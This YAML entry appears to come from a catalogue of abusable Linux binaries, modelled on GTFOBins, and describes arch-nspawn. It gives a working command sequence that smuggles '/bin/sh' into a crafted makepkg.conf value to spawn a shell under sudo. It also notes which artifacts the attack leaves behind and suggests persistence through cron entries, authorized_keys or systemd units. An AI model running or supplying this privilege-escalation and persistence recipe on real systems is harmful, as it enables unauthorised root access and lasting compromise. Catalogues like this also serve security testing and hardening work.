---
name: arch-nspawn
capabilities:
- exec
- spawn
required_permissions:
  level: sudo
  notes: Requires sudo rule for this binary.
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    mkdir -p ./etc/
    grep -oP "^CHROOT_VERSION='\K[^']+" /usr/share/devtools/lib/archroot.sh >.arch-chroot
    touch ./etc/pacman.conf
    echo 'CARCH=true;/bin/sh;exit' >etc/makepkg.conf
    arch-nspawn .
references:
- https://gtfobins.github.io/gtfobins/arch-nspawn/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
